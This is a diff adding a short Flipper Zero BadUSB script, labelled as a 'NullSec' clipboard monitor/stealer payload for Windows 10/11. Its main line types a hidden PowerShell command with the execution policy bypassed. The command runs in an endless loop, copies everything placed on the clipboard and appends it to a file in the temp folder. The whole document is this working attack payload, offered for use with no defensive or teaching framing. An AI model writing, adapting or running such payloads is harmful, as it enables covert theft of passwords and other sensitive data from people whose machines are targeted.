@@ -1,0 +1,10 @@
+REM ========================================
+REM NullSec Flipper Zero BadUSB
+REM Payload: Clipboard Monitor/Stealer
+REM Target: Windows 10/11
+REM ========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass -c "$log='$env:TEMP\clip.txt';while($true){$c=Get-Clipboard -Raw;if($c -and $c -ne $last){$c|Out-File $log -Append;$last=$c};Start-Sleep 2}"
+ENTER
